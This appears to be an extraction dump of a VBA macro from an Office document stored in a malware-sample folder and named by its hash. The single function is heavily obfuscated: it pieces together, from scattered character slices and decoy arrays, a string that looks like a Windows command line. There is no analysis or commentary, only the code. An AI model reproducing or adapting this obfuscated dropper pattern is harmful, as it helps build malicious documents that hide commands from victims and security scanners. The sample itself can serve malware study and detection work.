Filename     : ./macros/30fccfbdded3c6c2dfbfac15ae1cbe5a99086d0b0af096750aea521238e126e7
OLE stream   : Macros/VBA/WvzhElVPH
VBA filename : WvzhElVPH.bas
----------------------------------------
Attribute VB_Name = "WvzhElVPH"
Function AfGvjSpJM()
iDjFwi = "iuvruvW kAJwsrqlwhKho"
fUTzPTZ = Mid(iDjFwi, 8, 1)
qLOPufj = Array("LHJGhmWj", "IULkqEIj", "HfrwvrAm", "opITUjUw", "hbjQnfGJ")
OwXdBDUoA = Array("rofKEaTN", "zEzPoVRU", "GXRsiCOb", "ANCPYrsc", "YiGHLqhN")
FmGjrqimU = Array("VuUQjEKM", "JMJQONio", "ZDJqYEpH", "LXqFOKIP", "pDWjizvv")
PjcHqYknPi = "ApPpQsFR/c WIzwbjlGpswSCTlCnOHdfulJOKQfmu"
jStzjIP = Mid(PjcHqYknPi, 9, 3)
RCiRoLhWS = Array("DqFMhbOL", "DShHjqpR", "ENEJNEzz", "DuaKqvGb", "IOnhwdZk")
HKBbfLQCpsp = Array("JfBwcAjz", "NFfVtliw", "tFInBDUI", "MGwSDISb", "oUzhCAWC")
WtlIA = Array("KbzlPkiX", "fontVliF", "LtkWBQwE", "mEhYmAvs", "jFdaGisb")
AGbLStbwO = "qzCOUhJbMAT ubDmfkqaiiuotKbhniGnrbi"
kojclNuvDjE = Mid(AGbLStbwO, 12, 1)
jLvtGz = Array("XbmOVZFC", "luVJQABt", "fswLDJkf", "suKPIIwd", "AIwZihjN")
IlQvltBwCm = Array("winrimci", "EjuOjhXO", "qHWaPqud", "vsJHBbPz", "IlMZWtAG")
GiQYnGfCzRl = Array("SbLYNktS", "lkjXLJzI", "jKwlcUhd", "TwGzVzsz", "GPHofVPL")
IKdWwKXoOD = "BFrFDKKcfpapT   kwKFZ"
UXVcZ = Mid(IKdWwKXoOD, 14, 3)
HifmNE = Array("wrWRrsmw", "oEqMzOdw", "thFQivzn", "rlQvBJcN", "ulmlzQla")
VKPTNhTPA = Array("KHJQGjAr", "lJvzQwjD", "tiZGbqwf", "bdRLbsAd", "wiGXmjhL")
GdsFoMsbKkb = Array("lYJsNfww", "EjrPqfzT", "KiodPoPt", "IRBmrJQM", "BOVChERw")
vtrKOnLX = "pIMOZqODsdSmXmlKNpOBKT   BiDjjoFXPvqqv"
EAQoAcBqYDX = Mid(vtrKOnLX, 23, 3)
liImzurlvW = Array("jUHrAlmR", "fnMIrDww", "IPkwdKFu", "TfNcJwmG", "MszujYtW")
Tcfora = Array("fkGEwIUz", "SYtRUVSV", "PMYUYKHj", "AGvzGBPk", "WNQtEAzL")
qEbnA = Array("KPJkCVlr", "abfUzYwU", "dXDqMVrQ", "JJuGEZRO", "ONKIAWhf")
MUnJQSNSQzi = "L  rnJjTzmunaSMhCQYUjB"
kBjQSiRlOs = Mid(MUnJQSNSQzi, 2, 2)
iICqwkp = Array("UEYfVvlz", "OwPjzHwo", "YsbtafnA", "JRFmOqTG", "qYVIwLuO")
TcElpnJwnL = Array("YzsHJkRG", "OWjIvoEp", "RXVEpwjX", "dJqYmqrM", "wNVcmfrY")
TNctnNKDTP = Array("AwYsGLLC", "TfqYqqYZ", "OUizusUX", "iWJhTbDm", "jwDqarQR")
ZcZICPPdm = "KCpSuSRoHqvqNjaIYlWv"
VZCYURpiI = Mid(ZcZICPPdm, 3, 1)
LuDrFNfHw = Array("woEGzSWH", "ovOSAriH", "iANkBdir", "cEstnizW", "DMBFnOXL")
bLdmfGv = Array("ACtXNklo", "SvMZdjQU", "FNdvadUG", "wrPopZUP", "dCkwkLis")
HlwwiAGiLp = Array("TDarVZtW", "vhzakckW", "imbVVzwt", "bwwawRku", "ilbWCckW")
QsOWwXXlMQD = "pLNNLhvCvzfvSB   Dt"
WBqvwMdKaT = Mid(QsOWwXXlMQD, 15, 3)
hNoSB = Array("wssIZtiA", "RNQzkJWW", "FhPYdTai", "zFszAOTF", "BEXdEqTh")
SJuwmvwwcF = Array("SvIiBmKZ", "OFRUNLtf", "SOLTBfzD", "tKvfltRO", "OhGhKrcK")
dRGOVvjn = Array("vTkuwzsp", "LsKqizjm", "vEprqinV", "oCGfFLUb", "lAYiuFHu")
wRwEPTu = "vuMXNwMQMmMqwWrCiJNVNARwAJnCwXnDoVRUf"
HWLHMGw = Mid(wRwEPTu, 10, 1)
zNNCaRLjF = Array("SFTtiakO", "BTlFClUQ", "fOGttNkz", "XjEibwsq", "zuYkLtnN")
qCZNRKH = Array("SrdlaOZA", "fICfwNAE", "VTWwVGnC", "buIHMkFm", "bsbBjzZI")
sSHpiBMhZm = Array("KEwSvMsk", "tTPrXosM", "DaJjGRov", "CQDFlzVV", "uNoRHUHP")
wudrvuF = "fVXdvhebftEO"
AUNiZ = Mid(wudrvuF, 7, 1)
iLpsrZ = Array("BYNsUOOn", "APwIpsCs", "PCQfImwu", "wtwKzaEj", "TuihEwao")
bVfsbFCoJ = Array("BQFWBMjB", "KvCFEbGP", "aStbREoZ", "LPouOUoT", "bbdshctl")
NMsqn = Array("NuzDYwir", "oPHlCzWz", "cfKmXlnq", "HiidwOiz", "ZIOWFkAM")
MrUAR = "GHjEbTjvi  FVjfiwhihQkHrk"
UrnVHMrjz = Mid(MrUAR, 10, 2)
hLCHRdBCZj = Array("kzGzMCRb", "EjQBRHNb", "HJvpUBtZ", "hJMtlArr", "izBafndF")
SOaURq = Array("RCYRwjjR", "vnPwoLsj", "DjSCpXqE", "oYWTFmvU", "fpXRcbbA")
omKzPsctX = Array("dvwwkvCT", "FSXwVaQu", "MTdZKMLI", "rvQwnaGb", "FRZuYsTs")
LzsKrf = "qsEAIwnqzFwijEnoXOhZIdQjn fHBnKLa"
jzItEw = Mid(LzsKrf, 26, 1)
WiXZRKmBFa = Array("VCOnOwwF", "ZdFJwBqR", "jpGpfEji", "MwtDBWVT", "AkEHwXtu")
QChtJC = Array("wKZJVzcE", "bIKimiMR", "WkbSDvED", "HmINziTL", "wLtViWJO")
dbGcsL = Array("TpbtLmhV", "YmlNwarA", "GVCjoPHt", "ozmalrmz", "bMzOTLsU")
RBadbmqGfb = "tRwQrDQOcRMfWi &ut"
lumMOUG = Mid(RBadbmqGfb, 15, 2)
KsGVDOU = Array("EnpKwFPV", "TsOJUZaD", "hiEMAHkj", "zmmjbdhv", "dhiBZwwj")
XwGjwwkb = Array("jRGscdiB", "lvjlGjUz", "CIKKSfuq", "LTjnvZil", "lUciArEW")
kSchAH = Array("Hlzfwvow", "MhwRmmQE", "XPhIwrFM", "RvAmElwK", "EnChhOuP")
LMCwwG = "MzjbKbtcdjvkziKGoatrwEiuGNBLZkfnSP"
vnwjQcN = Mid(LMCwwG, 9, 1)
VXizO = Array("fjaNbMwz", "DXLkJvZQ", "flOAvBsa", "koNwjjWI", "VSdNQskE")
VMISWMl = Array("wAijaMAI", "NlBvAtUd", "rAdnzAPT", "BDPrSMAn", "AJEuSLAY")
bqPsXM = Array("nEkwhaHb", "zzVQOzEw", "lOfWwIqB", "lOvrpaKf", "zFzvPRma")
JMbnDoqztfc = "RcmBKQkzsmcp"
imMGUXEAAQL = Mid(JMbnDoqztfc, 2, 1)
uJYlUi = Array("vnuSrkYD", "EHIEjdbf", "OjMTfQmW", "ppQJwJjT", "cFbJNYJA")
wvnzOOcp = Array("qrmhRGzV", "dUjjETui", "BXcBTOEv", "bpbbCSRq", "ZMcniFFi")
WDKfrJXKW = Array("pvjicAPJ", "KzIqvIjb", "nqGcfYTL", "DqGsqHzv", "SuLYiaSa")
hdzajqG = "hjj  KrsNVfXwGzmInWVrbzkBDoWnUwvX"
BjvTRX = Mid(hdzajqG, 4, 2)
XLLcX = Array("aRREJbvR", "fAAowdDR", "cUamuWTC", "wMXAwItM", "YfCNHOBc")
uMqAkznV = Array("voMpHLzp", "quvNzfjD", "wOGzDuVW", "HnPSaqJN", "SwrFJdvm")
HICpzhIFRE = Array("OiKCMjMs", "zwOtHEYA", "SqiTviOA", "kiuBoatU", "SUiUjTJa")
GtXroE = "vunoQoWAQjwHBTHHCdi   IjoKqzODD"
EwXZi = Mid(GtXroE, 20, 3)
fhwLzK = Array("aXTbbQFO", "ZqmTvcqk", "UJRilLEY", "FuanVEQz", "jHsYKmZU")
ziWNOri = Array("cjbznaYq", "dwAaBfpO", "SuWjpRsV", "anmojSZh", "kzCFkGlf")
wjkzmtEjl = Array("VkKXDqzB", "SdFQQsiK", "nGXAnkGK", "YSpEcjiM", "JqLFHVRj")
iMzmKdGikib = "w wmWDZFHUCKpCElMzqvKnjFckimwsHZdZNvmwNUFB"
bWDIrz = Mid(iMzmKdGikib, 2, 3)
jqnLDt = Array("pkWFMJRr", "TrSijkrk", "dAzlBtYi", "ztGZhYDS", "onLDOBzP")
tfpzUZYN = Array("AzllRAcY", "zabGVfiv", "LnGTCsKu", "nzpvZoWc", "CkkDInQw")
lajvlhrLozs = Array("QhZGzwwI", "FPrauiMH", "mqwRLjzK", "EwElvinY", "XHCUSEwq")
qDkWn = "ljUhbhuCwHjIFnYOGnEwdMkC   uGodKnF"
kIGHkirM = Mid(qDkWn, 25, 3)
FzZfz = Array("DjqKzviY", "XdQRpwnk", "iPBwsKNa", "bSDmbsoi", "tHOiqpNJ")
XRbkDr = Array("QjOROVjY", "USmDCwwt", "SPiisvwf", "ohXhkItt", "CsiLwvMF")
NIOdsr = Array("jiSJFlfv", "IULbGiQV", "kidjwBoL", "YtBKQmzX", "CcuOcmZC")
cufjPAuh = "vMOMPviHUzviRNFNEbtbr WlFuiFopfStPEc"
AoQHLlmzZt = Mid(cufjPAuh, 22, 1)
lNCwfIYaQ = Array("CcYPzSmT", "bMbNSfHh", "pHkMkVfW", "XoYdnCsz", "JaiVcYOG")
WEhaaza = Array("GhjDKjFX", "VNYVBMSh", "wCrItIfY", "UiDrBlER", "siFClcLo")
DlODvh = Array("jBIaiWvw", "IzYajFMw", "CKijjNVj", "IHcXHPvU", "rDYsAEuz")
iRUPARq = "ITiLBSCmfjFKQqOT  SwMfikOMWZBV"
PMbcA = Mid(iRUPARq, 17, 2)
MErMwJvmXD = Array("iHiENikm", "SHAatiHV", "fZSWtYps", "BDichTwz", "QkwYfQWd")
wJwhpSZTNGz = Array("WpFzPUbM", "vCMamXDK", "RqCJwHFw", "JCKIjjqP", "DpzDTpcj")
TAqlOCMC = Array("cVjiGXLs", "joHoNMhP", "kGqMKTjM", "MzXwYAqc", "NWhaabrl")
XauCJmfPjXL = "zvNztMwL/vzvzTiM"
XjkLB = Mid(XauCJmfPjXL, 9, 2)
NNXwUtzUpK = Array("rRbsbCBq", "IkTMwPWI", "pURJzOUj", "ziarfHoI", "PFVssokK")
HAwir = Array("whonjdiz", "zYkGJimd", "zuuzbJKA", "wKztudQB", "jHNRZjAT")
bRAwvQJDwM = Array("AcrGWhzh", "Ssuztnim", "XnrVjkDV", "IiXBUUDQ", "ubwwRDiO")
ItApSwNtYj = "jWwwfQwXzd%cOqowWcYfGVL"
twwTrUFoU = Mid(ItApSwNtYj, 11, 2)
VQzKwvz = Array("LQaCiTIv", "ZaulpinP", "ZWwnKzMw", "oiDRqkVT", "JdKQKAmp")
YwwvADpOp = Array("accuaSbP", "ojYvFqEN", "DcOEPqEo", "FbbLUWFZ", "jJNhVSYW")
wIhhUXuw = Array("CndKLZNT", "ZwMhmiZk", "XnowqPvR", "bzMvdWsl", "EsCbNucf")
sLhowZPAY = "vRnljwQQtLjcTcJomwiczwwRk"
wWmOk = Mid(sLhowZPAY, 19, 2)
QMKLEvsT = Array("NImXKYmA", "kdKhdZfm", "sLjMNSpC", "EadufzWd", "KIkhcXGC")
kowzcNDXc = Array("MLLAMKIi", "MPjBLQSv", "TkTkusVm", "GjWUowKU", "FjzBGpqt")
ztwfiPScKQ = Array("SwiQOVSu", "qoOsEVHU", "qZufnnpN", "FOvfQQpd", "tZSwJEYk")
mSiDEnTjazw = "BWKiziBiTJXlcZjZwFdUJcsCsTQI"
DztffrTtw = Mid(mSiDEnTjazw, 25, 1)
jTVfmzc = Array("OciAjRPj", "YfLjvLFi", "IUKzandZ", "zkzfDLKl", "BJQLIpio")
MkmXrilKCYR = Array("zMGlFIih", "TnoptYKb", "zFAwSkjM", "UafluuWS", "qWzNjrUq")
awvKuLiFz = Array("CRLPXUrc", "zpLCofWP", "fuQidwnY", "RVzXYwuH", "lKwAYQpz")
KkaTWulX = "rLkimwc% vCkcvoFLSfwdMimOhiz"
YWrWc = Mid(KkaTWulX, 7, 3)
XvctNjMO = Array("jCmEjTdK", "AkimapNF", "dnwCVUDC", "uDRijVrP", "EQvaKipz")
OKikR = Array("roWoOIjv", "zqWkSniO", "zkJfCzbf", "tThKumvv", "wBKjzPom")
mdEqXo = Array("XVhswGwR", "mjbZYKus", "MruvaWBK", "ubmQczRj", "vXHhRjjn")
lsmfEowrsG = "uSomHBQilhdMAMCnwhfLErAVXzD"
uOHSqm = Mid(lsmfEowrsG, 3, 2)
YucBjkBYT = Array("WQXNLVWn", "GSTGUsLA", "TWzXTjoo", "PriBCNad", "KHYKwozZ")
wXWwj = Array("FwKKdKPC", "MHNulJTq", "ciwTrVlt", "sqvMUABf", "XYRUViLE")
Vtlso = Array("cbovzfrB", "oiiQpfhk", "NRSnOCiL", "FiXNrwUw", "XurQjqtM")
AfGvjSpJM = imMGUXEAAQL + HWLHMGw + vnwjQcN + BjvTRX + bWDIrz + wWmOk + kBjQSiRlOs + lumMOUG + EwXZi + twwTrUFoU + uOHSqm + DztffrTtw + VZCYURpiI + AUNiZ + YWrWc + kIGHkirM + UXVcZ + XjkLB + EAQoAcBqYDX + fUTzPTZ + jzItEw + PMbcA + kojclNuvDjE + jStzjIP + UrnVHMrjz + WBqvwMdKaT + AoQHLlmzZt
End Function
